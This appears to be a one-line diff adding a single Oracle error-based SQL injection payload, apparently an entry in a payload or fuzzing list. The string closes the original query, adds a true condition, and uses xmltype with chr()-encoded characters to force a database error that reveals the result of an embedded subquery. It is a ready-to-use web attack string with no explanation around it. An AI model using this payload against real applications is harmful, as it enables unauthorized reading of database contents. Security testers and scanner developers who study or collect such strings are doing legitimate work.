@@ -1,0 +1,1 @@
+1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
